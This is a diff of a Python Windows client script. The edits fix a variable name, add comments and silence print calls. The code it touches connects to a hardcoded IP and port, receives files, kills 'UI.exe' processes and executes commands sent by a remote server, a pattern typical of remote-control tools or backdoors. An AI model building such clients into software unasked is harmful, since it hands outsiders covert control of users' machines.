@@ -9,7 +9,7 @@ import os
 strHost = "10.5.29.45"
 # strHost = socket.gethostbyname("")
 intPort = 5689
-fileCHnaged = 0
+fileChanged = 0
 
 strPath = os.path.realpath(sys.argv[0])  # get file path
 TMP = os.environ["TEMP"]  # get temp path
@@ -25,6 +25,8 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
 
+
+#TYr connecting to a socketon the specified port.
 def create_socket():
     global objSocket 
     try:
@@ -76,6 +78,8 @@ def recvall(buffer,objSocket):  # function to receive large amounts of data
         if len(bytData) == buffer:
             return bytData
 
+#to check if the IP already exists.
+#file_data is the IP which will be checked in the IP File.
 def CheckIp(file_data):
     with open('peers.txt','r') as f:
         listOfPeers = f.readlines()
@@ -89,6 +93,8 @@ def CheckIp(file_data):
         else:
             return True
 
+
+#To receive the file
 def upload(data):
     global fileChanged
     intBuffer = int(data)
@@ -105,7 +111,7 @@ def upload(data):
             i = 0
             for process in c.Win32_Process ():
                 if (process.Name == 'UI.exe'):
-                    print('its found')
+                    # print('its found')
                     result = process.Terminate()
                     if(i == 0):
 
@@ -117,12 +123,13 @@ def upload(data):
     except:
         objSocket.send(str.encode("Path is protected/invalid!"))
 
-    print (objSocket)
+    # print (objSocket)
     objSocket.close()
-    print (objSocket)
+    # print (objSocket)
     time.sleep(5)
     # sys.exit(0)
 
+#Execute the commands accordingly as received b the server.
 def execute_command():
     # try:
     strData = objSocket.recv(1024)
